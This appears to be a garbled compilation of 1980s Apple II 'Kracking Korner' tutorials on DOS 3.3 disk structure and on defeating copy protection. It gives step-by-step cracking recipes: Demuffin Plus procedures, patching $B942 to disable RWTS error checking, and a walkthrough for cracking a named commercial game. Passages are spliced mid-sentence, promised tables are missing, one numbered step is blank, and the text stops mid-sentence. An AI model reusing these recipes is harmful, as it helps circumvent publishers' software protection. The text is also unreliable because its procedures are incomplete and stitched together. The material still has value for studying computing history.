INTO EXACTLY WHY, EACH  BYTE  CAN REPRESENT ONLY 6 BITS OF AN ORIGINAL BYTE, WHICH MEANS THAT EACH BYTE HAS TWO BITS LEFT OVER.  PACKING THESE TOGETHER AT 6 BITS EACH REQUIRES ANOTHER 256 3 OR 86 DISKBYTES, FOR A TOTAL OF 256 86 342  BYTES , WHICH NO LONGER REPRESENT A NIBBLE OR HALF A BYTE, BUT 3 4 OF A BYTE  MAKE UP YOUR OWN NAME FOR IT, THERE'S NO REAL AGREEMENT WHAT IT SHOULD BE CALLED .    FOLLOWING THE DATA IS A SINGLE CHECKSUM BYTE  4 , WHICH WILL GIVE ZERO WHEN EXCLUSIVE ORED WITH ALL THE OTHER BYTES FROM THE DATA, AND THEN THE SAME ACTIVE CLOSING BYTES THAT WERE USED IN THE ADDRESS FIELD  5 . FINALLY, MORE GAPBYTES  6  PAD THE SPACE BETWEEN THIS DATA FIELD AND THE ADDRESS FIELD WHICH COMES NEXT.    THIS SEQUENCE IS REPEATED 15 MORE TIMES TO MAKE A COMPLETE TRACK, AND THERE IS USUALLY A LARGE  GAP  OF UP TO 128 FF'S SEPARATING THE LAST AND THE FIRST SECTORS ON THE TRACK.  ONE FINAL ITEM OF INTEREST IS THAT THE SECTORS DO NOT NORMALLY FOLLOW EACH OTHER IN NUMERICAL SEQUENCE OF 0,1,2...ETC.  THE ACTUAL SEQUENCE  CALLED  SKEWING  OR INTERLEAVING  IS CHOSEN FOR SPEED OF READING AND WRITING, AND CAN VARY ON SOME DOS'S WHICH ARE OTHERWISE STRICTLY IDENTICAL IN FORMAT TO DOS 3.3.    THIS WOULD BE A GOOD POINT, IF YOU'RE NOT ALREADY VERY COMFORTABLE WITH THE SEQUENCES DESCRIBED ABOVE, TO GET OUT A UTILITY WHICH WILL PERFORM A  NIBBLE READ  OF A DISK TRACK  INSPECTOR, NIBBLES AWAY, LOCKSMITH, ETC. , AND READ IN A STANDARD DOS TRACK.  SCAN THROUGH THE BYTES UNTIL YOU COME TO THE MAGICAL D5 AA 96 SEQUENCE, THEN COMPARE ALL THE BYTES WHICH FOLLOW IT TO THE DESCRIPTION GIVEN ABOVE. TRY A FEW TRACKS AND DECODE THE START OF SEVERAL SECTORS UNTIL YOU BECOME FAMILIAR WITH THE APPEARANCE OF THEM.  YOU'LL SAVE YOURSELF A LOT OF TIME AND EFFORT BY BECOMING FAMILIAR WITH THE APPEARANCE OF NORMAL DOS SECTORS AND TRACKS.    KNOWING THAT ALL THESE THINGS ARE REQUIRED TO MAKE A DISK COMPATIBLE WITH DOS 3.3  AND MAKE IT COPY WITH COPYA , YOU CAN EASILY SEE HOW TO MAKE A PROTECTED OR MODIFIED DOS   SIMPLY CHANGE ALMOST ANY ONE OF THE IMPORTANT BYTES IN EITHER OR BOTH FIELDS, AND MAKE THE APPROPRIATE CHANGES TO THE READ AND WRITE ROUTINES IN DOS.  IN ORDER TO APPRECIATE WHAT THIS MEANS, LET'S SPEND A MINUTE OR TWO ON THE STRUCTURE OF DOS.    JUST AS WAS GAUL, DOS IS DIVIDED INTO THREE MAIN PARTS.  THE FIRST ONE, CALLED THE COMMAND INTERPRETER, HAS BEEN DESCRIBED IN CONSIDERABLE DETAIL BY BERT KERSTHE DISK UNDER ANYTHING RESEMBLING A NORMAL DOS.  AFTER A COMMAND  KEYBOARD OR PROGRAM  HAS BEEN PROCESSED BY THE COMMAND INTERPRETER, AND THE RIGHT PART OF THE RIGHT FILE HAS BEEN SELECTED BY THE FILE MANAGER, THE RWTS ROUTINES ARE CALLED ON TO DO THE CRUCIAL JOB OF EXCHANGING INFORMATION BETWEEN THE APPLE'S MEMORY AND THE DISKETTE.    SPACE PREVENTS US FROM LISTING ALL THE ROUTINES, BUT THOSE OF PARTICULAR INTEREST ARE     ADDRESS  NAME  FUNCTION                                        B700 B749    DO 2ND STAGE BOOT LOAD, RUN HELLO PROG.

A.  D.  AS YOUR PRIMARY REFERENCES.  RETURNING TO THE SUBJECT OF DETECTING AND CIRCUMVENTING MODIFIED DOS'S, YOU HAVE A CHOICE.  YOU CAN EITHER LOOK FOR CHANGES BY INSPECTING A TRACK, OR YOU CAN SEARCH THROUGH THE ABOVE RWTS ROUTINES FOR SOMETHING THAT ISN'T NORMAL.  NEITHER APPROACH WILL WORK 100  OF THE TIME, SO IT'S BEST TO BECOME PROFICIENT AT BOTH. THE TABLE BELOW LISTS MOST OF THE CRUCIAL LOCATIONS IN RWTS THAT ARE COMMONLY CHANGED FOR THE PURPOSE OF PROTECTION.

ANY OF THE LOCATIONS ABOVE CAN BE MODIFIED, EITHER PERMANENTLY  WHICH CHANGES IN THE DOS IMAGE ON TRACKS 0 2 , OR TEMPORARILY.  THE TEMPORARY DOS CHANGES ARE MUCH TOUGHER TO FIND THAN THE PERMANENT ONES, SINCE THE CHANGES MAY BE ERASED AFTER THEY HAVE BEEN USED.  A GOOD EXAMPLE OF THIS WAS 'MASK OF THE SUN' AND 'THE SERPENT'S STAR', WHERE THE MAIN DISK IS PROTECTED  AMONG OTHER TECHNIQUES  BY USING FF'S FOR ALL THE EPILOG BYTES, BUT THE SAVE GAME IS WRITTEN OUT AND READ IN USING THE NORMAL DE AA'S.  A PAIR OF SUBROUTINES WAS CALLED TO SWAP THE BYTES IN AND OUT AS REQUIRED.  MUCH MORE DEVIOUS WAS THE PROTECTION SCHEME USED BY TSR ON 'COMPUTER DUNGEON' AND 'THESEUS AND THE MINOTAUR', WHERE EPILOG BYTES WERE COMPUTED ACCORDING TO WHICH TRACK WAS BEING READ.  THERE ARE MANY OTHER EXAMPLES OF DOS MODIFICATIONS USED TO KEEP US AT BAY, INCLUDING SOME SECONDARY PROTECTION TECHNIQUES, BUT WE'LL LOOK AT THOSE AFTER WE DESCRIBE THE BASIC APPROACHES TO UNPROTECTING THESE DISKS IN PART 5 OF THE BASICS OF KRACKING.  IN THE MEANTIME, STUDY THE FORMAT, BECOME FAMILIAR WITH THE STANDARD TRICKS, AND REMEMBER     THE NIGHT SHALL BE FILLED WITH MUSIC,      AND CARES THAT INFEST THE DAY,  SHALL FOLD THEIR TENTS LIKE THE ARABS,      AND AS SILENTLY, STEAL AWAY.          HENRY WADSWORTH LONGFELLOW                                                                                                                 KRAKOWICZ'S KRACKING KORNER                                         THE BASICS OF KRACKING 5                        UNPROTECTION OF MODIFIED DOS DISKS                                                                          IN EPISODE 4 OF THIS SERIES, WE BEGAN A DISCUSSION OF PROTECTION SCHEMES WHICH ARE BASED ON MODIFICATION OF A STANDARD APPLE DOS.  AS WE MENTIONED, THERE ARE MANY CHANGES WHICH CAN BE MADE, AND LITERALLY THOUSANDS OF COMBINATIONS OF WHICH CAN BE USED TO THWART THE STANDARD COPY PROGRAMS.  HOWEVER, RATHER THAN DWELLING ON ALL THE POSSIBLE TECHNIQUES, LET'S CONCENTRATE ON THE  SHOTGUN  APPROACH WHICH WORKS TO THE VAST MAJORITY.    REGARDLESS OF THE MODIFICATION TECHNIQUE USED, MOST OF THESE DISKS CAN BE RENDERED COPYABLE WITH SOME UTILITY PROGRAMS  BOTH OLD AND NEW .    IN GENERAL, IT IS POSSIBLE TO IDENTIFY DISKS WITH A MODIFIED DOS BY THE APPEARANCE OF A BASIC PROMPT AT THE BOTTOM OF THE SCREEN DURING THE BOOT.  SOME PROTECTORS HAVE BEGUN TO BYPASS THE ROUTINE WHICH OUTPUTS THE PROMPT, BUT YOU CAN STILL GUESS THAT THERE'S A MODIFIED DOS PRESENT IF THE BOOT SOUNDS LIKE A NORMAL DOS BOOT, BUT THE DISK WON'T COPY WITH COPYA  COMPARING THE SOUNDS MADE BY THE BOOT UNDER DIFFERENT PROTECTION SCHEMES CAN BE VERY VALUABLE AFTER YOU HAVE A FAIR AMOUNT OF EXPERIENCE WITH A GIVEN PUBLISHER AND HIS PROTECTION SCHEME.  IT CAN ALSO BE MISLEADING  I KNOW A LOT OF PEOPLE WHO SWORE THE LONG HEAD MOVE DURING THE BOOT OF THE SSI RDOS DISKS WAS A NIBBLE COUNT, WHILE IT TURNED OUT TO BE NOTHING MORE THAN LOADING IN A SHORT PROGRAM CALLED  QWERTY  FROM TRACK 18 22 .    THE CLASSIC PROGRAM FOR DEALING WITH MODIFIED DOS'S IS CALLED DEMUFFIN PLUS  WILL THE REAL AUTHOR PLEASE STEP FORWARD SOMEDAY TO ACCEPT THE THANKS OF THE ENTIRE WORLD OF SOFTWARE UNPROTECTORS  , AND IT WORKS IN MUCH THE SAME WAY AS APPLE'S MUFFIN PROGRAM.  MUFFIN WAS WRITTEN TO READ FILES FROM A DOS 3.2 DISK AND THEN WRITE THEM OUT IN 3.3 FORMAT. DEMUFFIN  AND A SIMILAR PRODUCT CALLED  NIFFUM   WERE WRITTEN TO CONVERT DOS 3.3 PROGRAMS TO 3.2 FOR THE REAL DIEHARDS. DEMUFFIN PLUS OPERATES ON THE SAME PRINCIPLE, BUT USES WHATEVER DOS IS IN MEMORY TO READ, THEN WRITES OUT TO AN INITIALLIZED DISK UNDER 3.3 FORMAT.  WHILE THIS IS A POWERFUL UTILITY, YOU MUST KEEP IN MIND THAT IT IS STRICTLY BASED ON DOS, AND WILL ONLY TRANSFER PROGRAMS WHICH CAN BE LOCATED FROM A CATALOG AS NORMAL TEXT, BINARY, INTEGER OR APPLESOFT FILES.    IT IS SAFE TO SAY THAT MORE SOFTWARE HAS BEEN UNPROTECTED WITH THIS UTILITY THAN WITH ANY OTHER, AND PROBABLY MORE THAN WITH ALL OTHERS COMBINED.  IT STILL FINDS FREQUENT APPLICATION TODAY, SO WE'LL TAKE A LITTLE TIME HERE TO DESCRIBE SEVERAL WAYS OF USING IT.    IN MOST CASES, THE CLASSICAL TECHNIQUE WHICH FOLLOWS FOR USING DEMUFFIN PLUS TO KRACK A MODIFIED DOS DISK IS RESTRICTED TO THOSE WITH AN APPLE II  NOT A II   OR A ROMCARD OR OTHER MODIFED F8 ROM WHICH ALLOWS YOU TO RESET INTO THE MONITOR  SEE THE BASICS OF KRACKING 1      1.  INITIALLIZE A DISK UNDER DOS 3.3, THEN DELETE THE HELLO PROGRAM  JUST TO BE SAFE .    2.  BLOAD DEMUFFIN PLUS, A 6000.    3.  BOOT THE PROTECTED DISK, AND AS SOON AS A PROMPT APPEARS, HIT RESET  GENERALLY ABOUT 3 4 SECONDS AFTER THE HEAD CLACKETY CLACK .    4.  FROM THE MONITOR, MOVE DEMUFFIN PLUS TO ITS NORMAL LOCATION WITH 803 6000.78FFM.    5.  TYPE 803G AND FOLLOW THE FAMILIAR FIDDISH INSTRUCTIONS FOR SLOT AND DRIVE USAGE.    6.  IF YOU WANT THE DISK TO AUTORUN FROM THE BOOT, DETERMINE THE NAME OF THE HELLO PROGRAM AND ENTER IT INTO TRACK 1, SECTOR 9, BYTES 75 92 WITH THE INSPECTOR  OTHERWISE THE DISK WILL ALWAYS LOOK FOR AN ACTUAL PROGRAM NAMED 'HELLO' .  IF THE HELLO PROGRAM HAPPENS TO BE A BINARY FILE, CHANGE BYTE 42 IN TRACK 0, SECTOR D TO  34, OR USE  14 TO EXEC A TEXT FILE FOR THE START.    IN ADDITION TO HIDING THE PROMPT, A NUMBER OF PUBLISHERS HAVE ADDED ROUTINES WHICH CLEAR OUT MEMORY DURING THE BOOT, OR LOOK FOR SPECIFIC DATA LOADED IN PREVIOUSLY  THE PLATO SERIES IS A GOOD EXAMPLE OF THIS  WITHOUT EXTENSIVE AND CAREFUL BOOT TRACING, IT IS VERY DIFFICULT TO GET THE DOS IN MEMORY INTACT . THE FOLLOWING APPROACH ELIMINATES THE NEED TO RESET INTO THE MONITOR, AND ALSO GETS AROUND MANY OF THE ROUTINES BEING ADDED TO THWART THOSE WHO WOULD RESET. BECAUSE THERE IS NO NEED TO RESET DURING THE BOOT, THIS APPROACH CAN BE USED ON ANY FLAVOR OF APPLE     YES, NIBBLESPOCK, EVEN ON A IIE .  BASICALLY, THE DIFFERENCE LIES IN USING THE COMMAND INTERPRETER AND FILE MANAGER PORTIONS OF A STANDARD DOS, AND ADDING TO IT THE MODIFIED RWTS FROM THE PROTECTED DISK   1. INITIALLIZE A DISK AS BEFORE.    2.  BOOT UP A STANDARD DOS DISK, AND BLOAD DEMUFFIN PLUS,A 4000  JUST TO BE SAFE .    3.  UNLESS YOU HAVE INSPECTOR IN ROM, BLOAD INSPECTOR,A 8800.    4.  USING THE INSPECTOR, READ TRACK 0, SECTOR 1 THROUGH TRACK 0, SECTOR 9 INTO  7700 TO  7FFF.  USE CONTROL I AFTER THE FIRST 'R' COMMAND TO SPEED THE LOAD  SEE THE SECTION BELOW ON CHANGING LOCATION  B942 IF YOU CAN'T READ THE SECTORS WITH THE INSPECTOR .    5.  GET INTO THE MONITOR, THEN MOVE THE RWTS THAT YOU JUST READ IN ON TOP OF THE RESIDENT RWTS WITH B700 7700.7FFFM.    6.  MOVE DEMUFFIN AS BEFORE WITH 803 4000.58FFM.    7.  TYPE 803G AND PROCEED WITH THE FILE TRANSFER.    THERE ARE A FEW CASES WHERE JUST A LITTLE MORE INTELLIGENCE IS USED TO MODIFY DOS AFTER THE PROGRAM BEGINS TO RUN  USUALLY THE MODIFICATION OF PROLOG EPILOG BYTES, BUT SOMETIMES A LITTLE BIT MORE , AND IN THIS CASE YOU HAVE TO BOOT THE DISK AND LET IT RUN A SECOND OR TWO BEFORE RESETTING.  THE INSPECTOR IN ROM IS A BIG HELP IN A CASE LIKE THIS   YOU CAN RESET AND SCAN THE ENTIRE DISK WITH THE 'SHIFT  ' KEYS TO SEE IF ALL THE SECTORS CAN BE READ WITH THE DOS CURRENTLY IN THE SYSTEM.  IF THEY CAN BE, CHANCES ARE GOOD THAT YOU WILL BE SUCCESSFUL WITH THE CONVERSION.  AFTER RESETTING, SAVE THE ENTIRE DOS WITH D00 9D00.BFFFM, THEN BOOT UP YOUR STANDARD DISK AND BLOAD DEMUFFIN PLUS.  PUT THE MODIFIED DOS BACK WITH 9D00 D00.2FFFM, AND PROCEED WITH STEPS 6 AND 7 ABOVE.    ASSUMING THAT THE ORIGINAL COPY WAS GOOD, AND THAT NO SECONDARY PROTECTION WAS USED, YOU SHOULD NOW HAVE A COPYA VERSION OF THE PROGRAM.  IN MANY CASES, IT'S POSSIBLE TO DO THE JOB WITH EVEN LESS HASSLE THAN THIS, SO LET'S LOOK AT WHAT IS  MAYBE  AN EVEN EASIER WAY.    MANY OF THE RWTS MODIFICATIONS ARE FAIRLY TRIVIAL, AND THE MOST COMMON CONSIST ONLY OF CHANGING THE PROLOG OR EPILOG BYTES FOR THE ADDRESS OR DATA FIELD.  YOU CAN OFTEN PRODUCE AN UNPROTECTED VERSION OF THESE DISKS BY MAKING A FEW BYTE CHANGE TO THE RWTS IN MEMORY, AND THEN RUNNING COPYA.

THERE ARE TWO SUBROUTINES   'READ', WHICH READS IN A SECTOR OF DATA AND LIVES FROM  B8DC TO  B943  AND 'RDADR', WHICH READS IN THE ADDRESS FIELD FOR A SECTOR FROM  B944 TO B99F.  NOTE THAT THESE ARE IN THE REVERSE ORDER OF THEIR USE IN READING A SECTOR.  LET'S LOOK FIRST AT RDADR   AFTER SETTING UP SOME PRELIMINARIES AT  B944  B94E, WE BEGIN TO LOOK   B94F  B96C  FOR THE THREE FAMOUS BYTES OF D5 AA 96 TO IDENTIFY THE START OF THE FIELD.  AFTER THEY ARE FOUND, THE VOLUME NUMBER, TRACK NUMBER, AND SECTOR NUMBER ARE STORED IN LOCATIONS  2F,  2E, AND  2D, RESPECTIVELY, AND THE CHECKSUM FOR THE ADDRESS FIELD IS VERIFIED   B96D  B98A .  FINALLY, THE TWO EPILOG BYTES OF DE AND AA ARE SOUGHT AT THE END OF THE FIELD   B98B   B99F .    AFTER AN ADDRESS FIELD IS SUCCESSFULLY READ, 'READ' IS EXECUTED TO READ IN THE DATA FIELD.  THE CODE FROM  B8DC TO  B8FE FINDS THE HEADER BYTES OF D5 AA AD, AND THE DATA SECTOR IS READ INTO A PAIR OF BUFFERS WITH THE CODE AT  B8FF B924  THE  NIBBLIZING  PROCESS STORED THE 256 BYTES FROM A PAGE OF MEMORY AS A TOTAL OF 342  NIBBLES  IN THE SECTOR, BUT LET'S NOT GET TOO WORRIED ABOUT THAT YET . FINALLY, THE CHECKSUM  ONE BYTE  IS CHECKED, AND THE EPILOG BYTES ARE ONCE AGAIN VERIFIED   B925  B941 .  NOTICE THE INNOCENT APPEARING  SEC RTS  AT B942 B943. THIS IS THE HEART OF THE ERROR DETECTION PROCESS, AND MOST FREQUENTLY MODIFIED  FOR OUR PURPOSES  PART OF THE ENTIRE ROUTINE.    THE ONE BYTE WHICH YOU SHOULD BECOME MOST FAMILIAR WITH IN ORDER TO DO ANY KRACKING, SNOOPING, OR DISK REPAIR IS THE  38 AT LOCATION  B942.  THE CARRY BIT  OF THE PROCESSOR STATUS WORD  IS USED THROUGHOUT THE RWTS ROUTINES TO INDICATE A DISK I O ERROR.  WHENEVER ANYTHING GOES WRONG, THE ROUTINES BRANCH TO  B942 TO SET THE CARRY AND RETURN.  THE OTHER ROUTINES IN RWTS MONITOR THE CARRY BIT, AND CHECK IT TO SEE IF THERE WAS A BAD ADDRESS READ, A BAD DATA READ, NO HEADER BYTES, WRONG EPILOG BYTES, ETC., ETC.      THE MOST IMPORTANT CHANGE YOU        CAN LEARN TO MAKE IS CHANGING         B942 TO  18  OR, IF YOU ARE         HOPELESSLY BASIC BOUND, POKE         47426,24 .           THE  18 IS 'CLC' OR 'CLEAR THE CARRY'.  BY CHANGING IT, YOU ARE SAYING TO THE RWTS ROUTINES   DON'T EVEN LOOK TO SEE IF THERE WERE ANY ERRORS.  ASSUME EVERYTHING IS ALL RIGHT AND GO ON .  THIS IS OBVIOUSLY NOT A GOOD GENERAL PROGRAMMING PRACTICE, SINCE YOU'RE DEFEATING ALL OF THE CAREFUL ERROR  CHECKING THAT DOS DOES, BUT IT'S VERY HANDY TO ALLOW COPYING OF A MODIFIED DOS.  IT WILL GENERALLY HANDLE CHANGES IN THE EPILOG BYTES OR INTENTIONAL ERRORS IN THE CHECKSUM OF EITHER FIELD, BUT NOT IN THE HEADER BYTES. HEADER CHANGES  BECAUSE THE BYTES ARE INDIVIDUALLY CHECKED FOR  MUST BE DONE BY MODIFYING THE APPROPRIATE CODE IN THE SUBROUTINE.  IN MANY CASES, THIS IS THE ONLY CHANGE WHICH WILL BE REQUIRED TO MAKE A COPYA VERSION OF THE DISK.    FOR INSTANCE, LET'S SUPPOSE YOU ARE TRYING TO KRACK A PROGRAM, AND YOU SUSPECT THAT THE PROTECTION CONSISTS OF A MODIFIED DOS.  READ IN AN ENTIRE TRACK WITH THE INSPECTOR OR NIBBLES AWAY II  THERE IS A BUG IN THE SHIFT N COMMAND IN SOME VERSIONS OF THE INSPECTOR  YOU CAN'T DO A NIBBLE READ ON ANOTHER TRACK UNLESS YOU FIRST NIBBLE READ IN TRACK ZERO .  EXAMINE AN ADDRESS FIELD AND ITS DATA FIELD. IF YOU FIND BOTH 'D5 AA 96' AND 'D5 AA AD', THEN REMOVE THE DISK AND BOOT UP COPYA. WHILE THE PROGRAM IS ASKING FOR THE SLOT AND DRIVE INFORMATION, PRESS RESET OR TYPE CTRL C.  DELETE LINE 70  LINE 90 IF YOU ARE USING THE INTEGER VERSION CALLED  COPY  , THEN FROM THE MONITOR CHANGE       B942 18    RE ENTER BASIC AND RUN THE PROGRAM.  CHANCES ARE VERY GOOD THAT THE RESULT WILL BE A COPYA VERSION OF THE DISK.  BE AWARE, HOWEVER, THAT YOU CAN PROPAGATE OR GENERATE ERRORS IN THIS PROCESS, SINCE ALL OF THE ERROR CHECKING IN RWTS HAS BEEN TURNED OFF.  AS ALWAYS, CHECK THE PROGRAM OUT THOROUGHLY AFTER KRACKING.    IF YOUR EARLIER SNOOPING REVEALED NON STANDARD HEADER BYTES, MAKE THE CHANGES LISTED BELOW AFTER RUNNING AND INTERRUPTING COPYA     ADDRESS FIELD   B955   BYTE  1     B95F   BYTE  2     B96A   BYTE  3       DATA FIELD   B8E7   BYTE  1     B8F1   BYTE  2     B8FC   BYTE  3     THEN PROCEED AS DESCRIBED EARLIER.    REGARDLESS OF WHETHER YOU MAKE THESE SIMPLE MODS, OR GO THROUGH THE DEMUFFIN PLUS PROCESS, BEAR IN MIND THAT SECONDARY PROTECTION SCHEMES CAN DEFEAT THESE ATTEMPTS AND REQUIRE YOU TO DO MUCH MORE IN THE WAY OF SNOOPING AND UNDOING. WE'LL PICK UP WITH A DISCUSSION OF THOSE TECHNIQUES NEXT TIME, AND PERHAPS BEGIN TO EXPLORE SOME NON STANDARD DISK FORMATS.    OUR QUOTATION OF THE WEEK  MONTH   IS FROM DON LANCASTER, IN THE INTRODUCTION TO HIS BOOK  ENHANCING YOUR APPLE II, VOL.  1   A SEMI GOOD BUT SERIOUSLY  STRETCHED  COMPILATION OF LITTLE HARDWARE TRICKS TO MAKE YOUR APPLE DO NEW THINGS       ANY ATTEMPT AT COPY PROTECTION WILL HACK OFF AND INCONVENIENCE YOUR LEGITIMATE USERS, AND IT WILL DRAMATICALLY INCREASE THE NUMBER OF BOOTLEG COPIES IN CIRCULATION...     THE BIG THING ABOUT COPY PROTECTION IS THAT IT DOESN'T.  A YEAR'S EFFORT BY A CRACKERJACK MILITARY CRYPTOGRAPY TEAM CAN USUALLY BE UNDONE IN FIFTEEN MINUTES, BETWEEN KLINGON ZAPPINGS, BY YOUR AVERAGE FOURTEEN  YEAR OLD.  AND, MORALITY AND ECONOMICS ASIDE, ONE FACT STANDS OUT...    UNDOING COPY PROTECTION IS FUN!     NOT ONLY IS IT FUN, BUT CRACKING THE UNCOPYABLE IS ABOUT THE MOST CHALLENGING AND REWARDING THING THAT YOU CAN POSSIBLY DO WITH YOUR APPLE.  AND, THE THINGS YOU LEARN ALONG THE WAY ARE EXACTLY THE SKILLS THAT YOU WILL NEED TO BECOME A REALLY GREAT PROGRAMMER.  SO, I GUESS WE SHOULD ALL BE THANKFUL FOR THE COPY PROTECTION PEOPLE SINCE THEY ARE ARE GIVING US ALL THIS FASCINATING ENTERTAINMENT AND SUPERB TRAINING AT AN UNBEATABLE PRICE.     BEAUTIFULLY PUT, DON  AN EXCELLENT RENDITION OF THE  KRACKIST'S MANIFESTO .                                                                                                     KRAKOWICZ'S KRACKING KORNER                                       THE BASICS OF KRACKING 106                        MATING ZONE   NIBBLIZING MYSTERIES                                                                         CONGRATULATIONS ARE DUE TO TOM LUHRS AND THE PEOPLE AT DATAMOST, FOR PROVIDING BOTH AN ENJOYABLE GAME AND AN ENJOYABLE CHALLENGE IN KRACKING THEIR LATEST OFFERING    MATING ZONE .  THE GAME IS DEFINITELY ABOVE AVERAGE FOR A SHOOT EM UP, WITH A NOVEL CONCEPT AND GOOD VARIETY IN THE BEHAVIOUR OF MATED PAIRS, EXPLODING EGGS, AND MULTIPLE LEVELS.  THE KRACK IS A LITTLE MORE DIFFICULT THAN THE MODIFIED DOS'S WE HAVE BEEN DISCUSSING, BUT WE ARE STILL DEALING WITH A RELATIVELY STANDARD RWTS.    AS SUPPLIED, THE GAME CAN BE COPIED WITH NIBBLES AWAY II  NO PARMS NEEDED  FOR TRACKS 0 F AND 10.5 TO 13.5.  EXCEPT FOR THE HALF TRACKING, THE ONLY DEVIATION FROM NORMAL DOS 3.3 SECTOR STRUCTURE IS AN EPILOG OF 'DF AA' INSTEAD OF THE NORMAL 'DE AA', FOR BOTH THE ADDRESS AND DATA FIELDS.  THE DISK ACCESS IS CONTROLLED BY AN ABBREVIATED RWTS LOADED ACROSS SCREEN MEMORY, WITH A CUTE LITTLE SURPRISE AT THE END.  I'LL START WITH A SYNOPSIS OF THE KRACKING PROCESS, AND EXPLAIN THE JUICY PARTS IN DETAIL LATER.  THE DESCRIPTION WILL BE LIMITED TO REDUCING THE GAME TO A COPYA DISK  HOWEVER, I STRONGLY SUSPECT THAT THE GAME CAN BE STUFFED INTO A SINGLE LONG BFILE  I KNOW, I THOUGHT THAT SIGMA 7 COULD BE, TOO, BUT THAT'S ANOTHER STORY FOR A LATER TIME .    THE KRACKING SEQUENCE IS TO FIRST RELOCATE THE HALF TRACKS, THEN ELIMINATE THE SECONDARY PROTECTION.  AMONG OTHER UTILITIES, NIBBLES AWAY II CAN BE USED FOR THE MOVE AS FOLLOWS     1.  BOOT NA II AND COPY TRACKS 0 F ONTO AN INITIALIZED DISK  YOU'LL WANT THE       OTHER TRACKS COPYABLE LATER .    2.  SELECT THE TRACK BIT EDITOR  T , THEN READ IN TRACK 10.5.  TYPE 'Z' TO       ALLOW NA II TO ANALYZE THE TRACK FOR WRITE OUT.    3.  CHANGE THE TRACK TO 10 EVEN, THEN INSERT THE COPY DISK.  TYPE 'W' TO       WRITE, THEN 'Y' TO CONFIRM.  WHAT WAS ON TRACK 10.5 OF THE ORIGINAL IS NOW       ON TRACK 10 OF YOUR COPY.    4.  REPEAT STEPS 2   3 FOR TRACKS 11.5, 12.5, AND 13.5.    5.  TELL THE PROGRAM THAT THE TRACKS HAVE BEEN CHANGED BY MODIFYING TRACK       1,SECTOR F, BYTE 19 FROM  1F TO  1E.    6.

THAT'S THE PROCEDURE, NOW LET'S GO OVER THE THEORY   NORMALLY, RWTS OCCUPIES THE MEMORY SPACE FROM  B700 TO  BFFF.  IN ORDER TO SQUEEZE IT INTO  400 7FF, COMPROMISES MUST BE MADE.  FIRST, A MINIUMUM OF ONE COMPLETE TRACK IS READ IN, AND THE SECTORS ARE DESTINED FOR SEQUENTIAL PAGES IN MEMORY, BUT WITHOUT THE INTERLEAVING USED BY DOS 3.3.  TRACKS ARE REFERRRED TO BY THE EQUIVALENT NUMBER OF HALF TRACKS   TRACK 6 IS C, F IS 1E, 10.5 IS 21, ETC.  THE TRACK READ ROUTINE INCREMENTS THE TRACK NUMBER BY TWO, THEN READS IN THE 16 SECTORS OF THE NEW TRACK.

ACCORDING TO MR.  SLIPPERY,  REAL MEN WRITE SELF MODIFYING CODE!  .    THIS IS AS IT SHOULD BE FOR ALL NORMAL SECTOR READING.  AT LOCATION  5E8, HOWEVER, ANOTHER DATA FIELD READ ROUTINE BEGINS.

THE BYTES READ IN ARE EOR'ED TOGETHER, AND IF THE RESULT, SHIFTED LEFT ONCE, IS NOT ZERO, THE READ IS REDONE.  THIS IS A VERY CLEVER LITTLE ANTI COPY ROUTINE WHICH WORKS AS FOLLOWS  WHEN THE SECTOR IS READ INTO MEMORY FROM THE DISK, ALL  156  342 DECIMAL  NIBBLES ARE READ IN AND POSTNIBBLIZED TO RECONSTRUCT 256 BYTES.  THESE BYTES ARE THEN RE NIBBLIZED AND WRITTEN OUT TO THE NEW DISK BEING MADE.  SINCE THE ORIGINAL NIBBLES OF DF AND AA WERE NOT THE RESULT OF A PRENIBBLIZING PROCESS, THEY WILL HAVE DISAPPEARED AS THE 50TH AND 51ST NIBBLES OF THE DATA FIELD, AND BEEN REPLACED BY THE NIBBLES WHICH RESULT FROM A LEGITIMATE NIBBLIZING AND EXCLUSIVE ORING PROCESS.  ONE PASS THROUGH ANY STANDARD DOS SECTOR BASED COPIER WILL THUS  DESTROY  THE SECTOR FROM THE STANDPOINT OF THE PROTECTION SCHEME.     THE SCHEME, ALTHOUGH A SUBTLE AND CUTE SECONDARY PROTECTION SYSTEM, IS RATHER HOLLOW, SINCE NOTHING FURTHER IS DONE WITH THE CHECKSUM OF THE  31 NIBBLES. THIS WAY, AS SOON AS THE SCHEME IS DECODED, THE ROUTINE CAN SIMPLY BE BYPASSED WITH NO PENALTY.    NOW, I REALIZE THAT THIS DISCUSSION BROUGHT MANY OF YOU TO THE  MEGO  POINT  GOVERNMENT TALK ACRONYM FOR  MY EYES GLAZE OVER   AT THE FIRST USE OF THE TERMS PRE  AND POST  NIBBLIZING.  THOSE WHO KNOW IT ALL NEED READ NO FURTHER, BUT FOR THOSE TO WHOM THIS IS STILL DIALECTIC SWAHILI, I WILL HUMBLY OFFER MY VERSION OF AN EXPLANATION  IN FULL KNOWLEDGE THAT IT MAY DO NO MORE THAN INCREASE THE EYE  GLAZE COEFFICIENT .  ONCE AGAIN, THE PRIMARY SOURCE FOR THIS SORT OF EXPOSITION IS  BENEATH APPLE DOS , WHICH BY NOW HAS ACHIEVED THE STATUS OF THE MOST FREQUENTLY REFERENCED TEXT IN ALL OF APPLE KRACKDOM, IF NOT APPLE PROGRAMMING IN GENERAL.    WE'RE STILL NOT READY TO GO INTO THE INNERMOST WORKINGS OF THE DISK STORAGE PROCESS  THAT'LL BE BASICS 107  BUT LET'S STIPULATE FOR THE MOMENT THAT THERE IS A NEED TO USE ONLY BYTES WHICH MEET CERTAIN STRICT REQUIREMENTS WHEN WRITING ONTO AN APPLE DOS 3.3 DISK.  THE STONE TABLETS CARRIED UP FROM CUPERTINO LIST THOSE REQUIREMENTS      1.  THE HIGH BIT OF THE BYTE MUST BE '1'    2.  THE BYTE MUST CONTAIN NO MORE THAN ONE PAIR OF ADJACENT ZEROES.    3.  THERE MUST BE AT LEAST TWO ADJACENT ONES IN THE BYTE, NOT INCLUDING THE       HIGH BIT.    AS IT TURNS OUT, THERE ARE EXACTLY 64 BYTES WHICH MEET ALL OF THESE CRITERIA. IN ORDER TO STORE INFORMATION ON THE DISK, WE MUST  ENCODE  A TOTAL OF 256 BYTES  ONE PAGE AND ALSO ONE SECTOR  IN THE 64 PSEUDO BYTES WHICH CAN BE WRITTEN.    64 DIFFERENT BYTES MEANS THAT WE CAN SET UP A TABLE IN WHICH EACH BYTE UNIQUELY CORRESPONDS TO ONE OF THE SIX BIT NUMBERS FROM 00 TO  3F  IN BINARY, 0000 0000 TO 0011 1111 .  THE PROCESS OF CHOPPING UP FULL 8 BIT BYTES INTO PIECES WHICH CAN CORRESPOND TO 6 